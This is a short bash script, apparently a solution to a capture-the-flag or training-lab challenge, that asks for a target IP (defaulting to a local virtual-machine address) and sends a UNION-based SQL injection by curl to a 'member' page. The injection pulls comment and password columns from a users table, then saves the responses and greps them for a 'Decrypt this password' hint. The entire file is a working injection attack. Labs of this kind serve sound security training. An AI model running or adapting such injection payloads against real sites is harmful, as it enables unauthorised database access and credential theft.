#!/bin/bash

echo input the IP address to inspect \(default IP address 192.168.56.3\):
read ip
# 192.168.56.3

if [ -z ${ip} ];
then
  ip="192.168.56.3"
fi

# echo "${ip}"
url="http://"${ip}"/?page=member"
# echo "${url}"

response=$(curl -s -G -d "id=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users" -d "Submit=Submit" "$url")
echo "${response}" > 1.html
open 1.html
response=$(curl -s -G -d "id=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users" -d "Submit=Submit" "$url" | grep "Decrypt this password")
echo "${response}" > 2.html
open 2.html
